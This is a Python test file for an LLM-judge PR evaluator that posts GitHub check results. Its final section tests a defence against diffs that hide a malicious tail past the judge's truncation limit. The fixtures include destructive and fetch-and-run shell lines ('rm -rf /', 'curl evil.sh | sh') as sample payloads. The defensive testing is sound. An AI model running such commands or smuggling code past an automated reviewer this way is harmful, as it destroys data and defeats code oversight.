"""Tests for the SpecForge PR-diff evaluator + status checks (Phase 21 — T-282).

Two layers:

- **Client surface** (``httpx.MockTransport``): the PR diff uses the diff media
  type; ``post_check_run`` maps a non-rate-limit 403 to
  ``GitHubChecksPermissionError`` (the Status-API fallback trigger); the commit
  Status API posts.
- **``run_pr_check`` service** (real DB + an in-memory stub client + fake redis,
  ``call_judge_model`` monkeypatched): a passing diff posts a ✓ check, a failing
  diff a ✗, a **judge error a neutral** check (fail-open, asserted on the
  check-run path where neutral is observable), a PR linked to no task a neutral
  check; the per-installation **budget** cap and the **debounce** window both
  skip the judge; the **head-SHA dedup** breaks re-entry; and a missing
  ``Checks: write`` permission **falls back to the commit Status API**.
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Any
from uuid import uuid4

import httpx
import pytest
from sqlalchemy import delete
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine
from sqlalchemy.pool import NullPool

from config import settings
from models import (
    GitHubInstallation,
    IntegrationPush,
    IntegrationPushTask,
    Stage,
    StageVersion,
    User,
    Workspace,
)
from services.integrations import pr_evaluator
from services.integrations.github_api_client import (
    GitHubChecksPermissionError,
    make_app_github_client,
)

pytestmark = pytest.mark.asyncio


_TASKS = (
    "# Tasks\n\n"
    "## Phase 1: Core\n\n"
    "### T-001: Add health endpoint\n\n"
    "**Description:** Expose a health check.\n\n"
    '**Acceptance criteria:**\n1. `GET /health` returns 200 with `{"status":"ok"}`.\n'
)


# ===========================================================================
# Client surface
# ===========================================================================


class _FakeTokenSource:
    async def get(self, installation_id: int) -> str:
        return "tok-1"

    async def refresh(self, installation_id: int) -> str:
        return "tok-2"


def _client(handler: Any):
    transport = httpx.MockTransport(handler)
    async_client = httpx.AsyncClient(transport=transport)
    return make_app_github_client(_FakeTokenSource(), 42, async_client)


async def test_get_pull_request_diff_uses_diff_media_type() -> None:
    seen: dict[str, Any] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen["accept"] = request.headers.get("Accept")
        seen["path"] = request.url.path
        return httpx.Response(200, text="diff --git a/x b/x\n+ok")

    client = _client(handler)
    diff = await client.get_pull_request_diff("o/r", 7)
    assert diff == "diff --git a/x b/x\n+ok"
    assert seen["accept"] == "application/vnd.github.v3.diff"
    assert seen["path"] == "/repos/o/r/pulls/7"


async def test_post_check_run_403_raises_checks_permission() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        # 403 with rate-limit remaining > 0 ⇒ a permission problem, not throttle.
        return httpx.Response(
            403,
            headers={"x-ratelimit-remaining": "57"},
            json={"message": "Resource not accessible by integration"},
        )

    client = _client(handler)
    with pytest.raises(GitHubChecksPermissionError):
        await client.post_check_run(
            "o/r",
            name="SpecForge / acceptance",
            head_sha="sha",
            status="completed",
            conclusion="success",
            title="t",
            summary="s",
        )


async def test_post_commit_status_posts() -> None:
    seen: dict[str, Any] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen["path"] = request.url.path
        seen["method"] = request.method
        return httpx.Response(201, json={"id": 1})

    client = _client(handler)
    await client.post_commit_status(
        "o/r",
        "abc123",
        state="success",
        context="specforge/acceptance",
        description="ok",
    )
    assert seen["method"] == "POST"
    assert seen["path"] == "/repos/o/r/statuses/abc123"


# ===========================================================================
# run_pr_check service
# ===========================================================================


class _StubClient:
    """In-memory stub of the GitHubAPIClient PR-check surface."""

    def __init__(self, *, body: str = "Closes #101", head_sha: str = "sha-1") -> None:
        self.pr: dict[str, Any] | None = {"head": {"sha": head_sha}, "body": body}
        self.diff: str | None = (
            "diff --git a/app.py b/app.py\n+def health(): return 'ok'"
        )
        self.checks_permission_error = False
        self.check_runs: list[dict[str, Any]] = []
        self.updated: list[dict[str, Any]] = []
        self.statuses: list[dict[str, Any]] = []
        self._counter = 900

    async def get_pull_request(self, repo: str, number: int) -> dict[str, Any] | None:
        return self.pr

    async def get_pull_request_diff(self, repo: str, number: int) -> str | None:
        return self.diff

    async def post_check_run(
        self,
        repo: str,
        *,
        name: str,
        head_sha: str,
        status: str,
        conclusion: str | None = None,
        title: str,
        summary: str,
    ) -> int | None:
        if self.checks_permission_error:
            raise GitHubChecksPermissionError("no checks scope")
        self._counter += 1
        self.check_runs.append(
            {"id": self._counter, "status": status, "conclusion": conclusion}
        )
        return self._counter

    async def update_check_run(
        self,
        repo: str,
        check_run_id: int,
        *,
        status: str,
        conclusion: str | None = None,
        title: str,
        summary: str,
    ) -> int | None:
        self.updated.append({"id": check_run_id, "conclusion": conclusion})
        return check_run_id

    async def post_commit_status(
        self, repo: str, sha: str, *, state: str, context: str, description: str
    ) -> None:
        self.statuses.append({"sha": sha, "state": state})

    @property
    def final_conclusion(self) -> str | None:
        if self.updated:
            return self.updated[-1]["conclusion"]
        completed = [c for c in self.check_runs if c["status"] == "completed"]
        return completed[-1]["conclusion"] if completed else None


class _FakeRedis:
    def __init__(self) -> None:
        self.store: dict[str, Any] = {}

    async def get(self, key: str) -> Any:
        return self.store.get(key)

    async def set(self, key: str, value: Any, ex: int | None = None) -> None:
        self.store[key] = value

    async def incr(self, key: str) -> int:
        self.store[key] = int(self.store.get(key, 0)) + 1
        return self.store[key]

    async def expire(self, key: str, ttl: int) -> None:
        return None


# The fakes accept **kwargs so they tolerate call_judge_model's full keyword
# surface (operation / cost_context were added in issue #26 Phase 0); a stricter
# signature silently turned every judge call into a TypeError → fail-open neutral.
def _judge(verdict_json: str, calls: list[int]):
    async def _fake(
        *, system_prompt: str, user_prompt: str, provider: Any = None, **_: Any
    ) -> str:
        calls.append(1)
        return verdict_json

    return _fake


def _judge_raises(calls: list[int]):
    async def _fake(
        *, system_prompt: str, user_prompt: str, provider: Any = None, **_: Any
    ) -> str:
        calls.append(1)
        raise RuntimeError("judge unavailable")

    return _fake


@pytest.fixture
async def session() -> AsyncSession:
    engine = create_async_engine(settings.database_url, poolclass=NullPool)
    maker = async_sessionmaker(engine, expire_on_commit=False)
    async with maker() as db:
        yield db
    await engine.dispose()


async def _seed(db: AsyncSession, *, pr_check_mode: str = "auto") -> dict[str, Any]:
    user = User(
        email=f"pr-{uuid4()}@example.com",
        google_id=f"g-{uuid4()}",
        name="U",
        avatar_url=None,
        credit_balance=100,
    )
    db.add(user)
    await db.commit()
    await db.refresh(user)

    ws = Workspace(
        user_id=user.id,
        name="WS",
        problem_statement="x" * 60,
        provider="anthropic",
        model="claude-sonnet-4-6",
        status="active",
    )
    db.add(ws)
    await db.commit()
    await db.refresh(ws)

    stage = Stage(
        workspace_id=ws.id,
        type="tasks",
        content=_TASKS,
        status="finalised",
        current_version=1,
        finalised_at=datetime.now(UTC),
    )
    db.add(stage)
    await db.flush()
    db.add(StageVersion(stage_id=stage.id, version=1, content=_TASKS, created_by="ai"))
    await db.commit()

    # Existing cost-control / judge tests predate the Phase-4 mode gate and
    # assume the judge runs on every push, so they seed ``auto``. The mode-gate
    # tests below pass ``off`` / ``manual`` explicitly (move-with-contract).
    inst = GitHubInstallation(
        installation_id=uuid4().int % 1_000_000_000,
        account_login="octo",
        account_type="Organization",
        repository_selection="all",
        user_id=user.id,
        pr_check_mode=pr_check_mode,
    )
    db.add(inst)
    await db.commit()
    await db.refresh(inst)

    push = IntegrationPush(
        workspace_id=ws.id,
        user_id=user.id,
        provider="github",
        installation_id=inst.id,
        repo_id=uuid4().int % 1_000_000_000,
        repo_full_name="octo/app",
        export_mode="pr_with_tests",
        status="completed",
    )
    db.add(push)
    await db.commit()
    await db.refresh(push)

    db.add(
        IntegrationPushTask(
            push_id=push.id, task_ref="T-001", external_issue_number=101, state="open"
        )
    )
    await db.commit()
    return {"user": user, "workspace": ws, "install": inst, "push": push}


async def _teardown(db: AsyncSession, seeded: dict[str, Any]) -> None:
    await db.execute(delete(Workspace).where(Workspace.id == seeded["workspace"].id))
    await db.execute(
        delete(GitHubInstallation).where(GitHubInstallation.id == seeded["install"].id)
    )
    await db.execute(delete(User).where(User.id == seeded["user"].id))
    await db.commit()


async def _run(
    session,
    seeded,
    stub,
    redis,
    monkeypatch,
    verdict_json=None,
    *,
    raises=False,
    trigger="auto",
):
    calls: list[int] = []
    if raises:
        monkeypatch.setattr(pr_evaluator, "call_judge_model", _judge_raises(calls))
    elif verdict_json is not None:
        monkeypatch.setattr(
            pr_evaluator, "call_judge_model", _judge(verdict_json, calls)
        )
    await pr_evaluator.run_pr_check(
        {}, str(seeded["push"].id), 7, trigger, db=session, client=stub, redis=redis
    )
    return calls


async def test_passing_pr_posts_success_check(session, monkeypatch) -> None:
    seeded = await _seed(session)
    stub, redis = _StubClient(), _FakeRedis()
    try:
        calls = await _run(
            session,
            seeded,
            stub,
            redis,
            monkeypatch,
            '{"passed": true, "findings": []}',
        )
        assert len(calls) == 1
        # Pending posted first (in_progress), then updated to success.
        assert stub.check_runs and stub.check_runs[0]["status"] == "in_progress"
        assert stub.final_conclusion == "success"
    finally:
        await _teardown(session, seeded)


async def test_failing_pr_posts_failure_check(session, monkeypatch) -> None:
    seeded = await _seed(session)
    stub, redis = _StubClient(), _FakeRedis()
    verdict = (
        '{"passed": false, "findings": '
        '[{"detail": "No /health route", "reference": "T-001"}]}'
    )
    try:
        await _run(session, seeded, stub, redis, monkeypatch, verdict)
        assert stub.final_conclusion == "failure"
    finally:
        await _teardown(session, seeded)


async def test_judge_error_posts_neutral_check(session, monkeypatch) -> None:
    """Fail-open: a judge error leaves the check NEUTRAL, not failing (AC#2)."""
    seeded = await _seed(session)
    stub, redis = _StubClient(), _FakeRedis()
    try:
        calls = await _run(session, seeded, stub, redis, monkeypatch, raises=True)
        assert len(calls) == 1
        assert stub.final_conclusion == "neutral"  # observable on the check-run path
    finally:
        await _teardown(session, seeded)


async def test_pr_with_no_linked_task_is_neutral_and_skips_judge(
    session, monkeypatch
) -> None:
    seeded = await _seed(session)
    stub, redis = _StubClient(body="Just a refactor, no task"), _FakeRedis()
    calls: list[int] = []
    monkeypatch.setattr(pr_evaluator, "call_judge_model", _judge("{}", calls))
    try:
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, db=session, client=stub, redis=redis
        )
        assert not calls  # no judge call for a PR with no SpecForge task
        # A completed neutral check is posted directly (no pending/update).
        assert stub.final_conclusion == "neutral"
    finally:
        await _teardown(session, seeded)


async def test_budget_exceeded_posts_neutral_and_skips_judge(
    session, monkeypatch
) -> None:
    seeded = await _seed(session)
    stub, redis = _StubClient(), _FakeRedis()
    # Pre-fill today's budget counter at the cap so the next incr exceeds it.
    day = datetime.now(UTC).strftime("%Y%m%d")
    redis.store[f"gh:prcheck:budget:{seeded['push'].installation_id}:{day}"] = (
        pr_evaluator.PR_CHECK_DAILY_BUDGET
    )
    calls: list[int] = []
    monkeypatch.setattr(pr_evaluator, "call_judge_model", _judge("{}", calls))
    try:
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, db=session, client=stub, redis=redis
        )
        assert not calls  # over budget ⇒ no judge call
        assert stub.final_conclusion == "neutral"
    finally:
        await _teardown(session, seeded)


async def test_debounce_skips_second_judge_within_window(session, monkeypatch) -> None:
    """A rapid second push (new SHA) within the debounce window skips the judge."""
    seeded = await _seed(session)
    stub, redis = _StubClient(), _FakeRedis()
    calls: list[int] = []
    monkeypatch.setattr(
        pr_evaluator,
        "call_judge_model",
        _judge('{"passed": true, "findings": []}', calls),
    )
    try:
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, db=session, client=stub, redis=redis
        )
        assert len(calls) == 1
        # A new commit arrives immediately — distinct SHA (so dedup wouldn't skip),
        # but the debounce window is still armed.
        stub.pr = {"head": {"sha": "sha-2"}, "body": "Closes #101"}
        before = len(stub.check_runs)
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, db=session, client=stub, redis=redis
        )
        assert len(calls) == 1  # judge NOT called again
        assert len(stub.check_runs) == before  # nothing posted for the debounced push
    finally:
        await _teardown(session, seeded)


async def test_head_sha_dedup_skips_re_entry(session, monkeypatch) -> None:
    """The same head SHA (e.g. a check_suite:completed echo) is not re-judged."""
    seeded = await _seed(session)
    stub, redis = _StubClient(), _FakeRedis()
    calls: list[int] = []
    monkeypatch.setattr(
        pr_evaluator,
        "call_judge_model",
        _judge('{"passed": true, "findings": []}', calls),
    )
    try:
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, db=session, client=stub, redis=redis
        )
        before = len(stub.check_runs) + len(stub.updated)
        # Re-deliver the SAME head SHA — must short-circuit before any work.
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, db=session, client=stub, redis=redis
        )
        assert len(calls) == 1
        assert len(stub.check_runs) + len(stub.updated) == before
    finally:
        await _teardown(session, seeded)


async def test_checks_permission_falls_back_to_commit_status(
    session, monkeypatch
) -> None:
    """Without Checks:write, the verdict posts via the commit Status API; a
    fail-open neutral maps to a non-blocking success state."""
    seeded = await _seed(session)
    stub, redis = _StubClient(), _FakeRedis()
    stub.checks_permission_error = True
    try:
        await _run(session, seeded, stub, redis, monkeypatch, raises=True)
        # No check runs created (all 403'd); statuses carry the fallback.
        assert not stub.check_runs
        states = [s["state"] for s in stub.statuses]
        assert "pending" in states  # the up-front pending status
        assert states[-1] == "success"  # neutral collapsed to non-blocking success
    finally:
        await _teardown(session, seeded)


# ===========================================================================
# pr_check_mode gate (issue #27 Phase 4)
# ===========================================================================


def _skipped_disabled() -> float:
    """Current value of the pr_check ``disabled`` skip counter."""
    from services.observability import JUDGE_CALLS_SKIPPED_TOTAL

    return JUDGE_CALLS_SKIPPED_TOTAL.labels(
        purpose="pr_check", reason="disabled"
    )._value.get()


async def test_mode_off_skips_judge_and_posts_disabled_neutral(
    session, monkeypatch
) -> None:
    """``off`` never judges: a neutral 'disabled' check posts, no judge call."""
    seeded = await _seed(session, pr_check_mode="off")
    stub, redis = _StubClient(), _FakeRedis()
    before = _skipped_disabled()
    try:
        calls = await _run(
            session,
            seeded,
            stub,
            redis,
            monkeypatch,
            '{"passed": true, "findings": []}',
        )
        assert not calls  # judge never issued
        assert stub.final_conclusion == "neutral"
        assert _skipped_disabled() == before + 1
        # done_key armed so the check_suite:completed echo is deduped.
        assert redis.store[f"gh:prcheck:done:{seeded['push'].id}:7"] == "sha-1"
    finally:
        await _teardown(session, seeded)


async def test_mode_manual_auto_push_skips_and_posts_manual_neutral(
    session, monkeypatch
) -> None:
    """``manual`` + an automatic push: neutral 'manual mode' check, no judge."""
    seeded = await _seed(session, pr_check_mode="manual")
    stub, redis = _StubClient(), _FakeRedis()
    before = _skipped_disabled()
    try:
        calls = await _run(
            session,
            seeded,
            stub,
            redis,
            monkeypatch,
            '{"passed": true, "findings": []}',
            trigger="auto",
        )
        assert not calls
        assert stub.final_conclusion == "neutral"
        assert _skipped_disabled() == before + 1
    finally:
        await _teardown(session, seeded)


async def test_mode_manual_with_manual_trigger_runs_judge(session, monkeypatch) -> None:
    """``manual`` + an explicit re-run: the judge runs and the check reflects it."""
    seeded = await _seed(session, pr_check_mode="manual")
    stub, redis = _StubClient(), _FakeRedis()
    before = _skipped_disabled()
    try:
        calls = await _run(
            session,
            seeded,
            stub,
            redis,
            monkeypatch,
            '{"passed": true, "findings": []}',
            trigger="manual",
        )
        assert len(calls) == 1  # judge ran
        assert stub.final_conclusion == "success"
        assert _skipped_disabled() == before  # not a skip
    finally:
        await _teardown(session, seeded)


async def test_manual_rerun_bypasses_head_sha_dedup(session, monkeypatch) -> None:
    """A manual re-run judges the SAME head SHA even after an auto skip armed the
    dedup key; the subsequent completion echo (auto) is still deduped."""
    seeded = await _seed(session, pr_check_mode="manual")
    stub, redis = _StubClient(), _FakeRedis()
    calls: list[int] = []
    monkeypatch.setattr(
        pr_evaluator,
        "call_judge_model",
        _judge('{"passed": true, "findings": []}', calls),
    )
    try:
        # 1. Automatic push → manual-mode neutral, no judge, done_key armed.
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, "auto", db=session, client=stub, redis=redis
        )
        assert not calls
        # 2. User clicks Re-run on the same SHA → judge runs despite done_key.
        await pr_evaluator.run_pr_check(
            {},
            str(seeded["push"].id),
            7,
            "manual",
            db=session,
            client=stub,
            redis=redis,
        )
        assert len(calls) == 1
        assert stub.final_conclusion == "success"
        # 3. Our verdict's check_suite:completed echo (auto, same SHA) is deduped.
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, "auto", db=session, client=stub, redis=redis
        )
        assert len(calls) == 1  # no second judge
    finally:
        await _teardown(session, seeded)


# ===========================================================================
# Finding #6 — hunk-aware truncation, so a hidden malicious tail cannot ride a
# clean pass on the compliant, visible head.
# ===========================================================================


def _file_diff(path: str, body: str) -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"index 0000000..1111111 100644\n"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        f"{body}\n"
    )


async def test_truncate_diff_by_hunk_no_op_under_budget() -> None:
    diff = _file_diff("a.py", "+x = 1")
    bounded, truncated = pr_evaluator._truncate_diff_by_hunk(diff, 10_000)
    assert bounded == diff
    assert truncated is False


async def test_truncate_diff_by_hunk_cuts_on_file_boundary_not_mid_hunk() -> None:
    compliant = _file_diff("compliant.py", "+" + "x" * 50)
    malicious = _file_diff("malicious.py", "+" + "os.system('rm -rf /')")
    diff = compliant + malicious
    # Budget lands after the first file section but before the second.
    bounded, truncated = pr_evaluator._truncate_diff_by_hunk(diff, len(compliant) + 10)
    assert truncated is True
    assert bounded == compliant
    # The malicious section must be entirely absent — never a half-cut hunk.
    assert "malicious.py" not in bounded
    assert "os.system" not in bounded


async def test_truncate_diff_by_hunk_no_git_header_falls_back_but_flags_truncated() -> (
    None
):
    diff = "not a unified diff " * 1000
    bounded, truncated = pr_evaluator._truncate_diff_by_hunk(diff, 100)
    assert len(bounded) == 100
    assert truncated is True


async def test_truncate_diff_by_hunk_first_section_over_budget_falls_back_to_head() -> (
    None
):
    # A single giant first file section (a lockfile diff, say) must not produce
    # an (essentially empty) preamble-only diff: the judge would near-certainly
    # FAIL an empty diff, and _verdict_for deliberately preserves truncated
    # failures — red-lighting the PR on zero evidence, violating fail-open.
    # Fall back to the raw head cut instead; a pass still downgrades to neutral.
    giant = _file_diff("pnpm-lock.yaml", "+" + "y" * 5_000)
    bounded, truncated = pr_evaluator._truncate_diff_by_hunk(giant, 100)
    assert truncated is True
    assert len(bounded) == 100
    assert bounded == giant[:100]  # real head content, not an empty string


async def test_verdict_for_downgrades_truncated_pass_to_neutral() -> None:
    # The exploit this closes: a judge that legitimately says "passed" on the
    # visible (compliant) head must NOT surface as a clean pass when the tail
    # was hidden by truncation.
    outcome = pr_evaluator._JudgeOutcome(
        pr_evaluator.PRReviewResult(passed=True, findings=[]), diff_truncated=True
    )
    verdict = pr_evaluator._verdict_for(outcome)
    assert verdict.conclusion == "neutral"
    assert "truncated" in verdict.title.lower()


async def test_verdict_for_truncated_failure_still_reports_failure() -> None:
    # A truncated diff the judge still failed is a genuine, informative
    # signal — it must not be suppressed just because truncation occurred.
    outcome = pr_evaluator._JudgeOutcome(
        pr_evaluator.PRReviewResult(
            passed=False,
            findings=[
                pr_evaluator.PRReviewFinding(
                    detail="Missing endpoint", reference="T-001"
                )
            ],
        ),
        diff_truncated=True,
    )
    verdict = pr_evaluator._verdict_for(outcome)
    assert verdict.conclusion == "failure"


async def test_verdict_for_untruncated_pass_is_success() -> None:
    outcome = pr_evaluator._JudgeOutcome(
        pr_evaluator.PRReviewResult(passed=True, findings=[]), diff_truncated=False
    )
    assert pr_evaluator._verdict_for(outcome).conclusion == "success"


async def test_adversarial_diff_hides_malicious_tail_past_truncation_boundary(
    session, monkeypatch
) -> None:
    """End-to-end: a PR author front-loads a compliant change and appends a
    non-compliant one past SpecForge's char bound. The judge — which only ever
    sees the bounded prompt — legitimately returns passed=true for what it was
    shown. Before the fix this posted a clean 'success' check on a diff whose
    tail was never evaluated; after the fix it must post 'neutral', not
    'success', because pr_evaluator._judge itself truncates the diff and
    threads diff_truncated through to _verdict_for.
    """
    seeded = await _seed(session)
    stub, redis = _StubClient(), _FakeRedis()
    # `compliant` alone sits comfortably under the char bound; appending
    # `malicious` pushes the total over it, so the hunk-aware cut must keep
    # the whole compliant section and drop the malicious one entirely.
    overhead = len(_file_diff("health.py", "+"))
    padding = pr_evaluator._MAX_DIFF_CHARS - overhead - 100
    compliant = _file_diff("health.py", "+" + "x" * padding)
    malicious = _file_diff("backdoor.py", "+os.system('curl evil.sh | sh')" + "z" * 500)
    stub.diff = compliant + malicious
    assert len(compliant) < pr_evaluator._MAX_DIFF_CHARS
    assert len(stub.diff) > pr_evaluator._MAX_DIFF_CHARS
    calls: list[int] = []
    monkeypatch.setattr(
        pr_evaluator,
        "call_judge_model",
        _judge('{"passed": true, "findings": []}', calls),
    )
    try:
        await pr_evaluator.run_pr_check(
            {}, str(seeded["push"].id), 7, db=session, client=stub, redis=redis
        )
        assert len(calls) == 1
        assert stub.final_conclusion == "neutral"
        assert stub.final_conclusion != "success"
    finally:
        await _teardown(session, seeded)
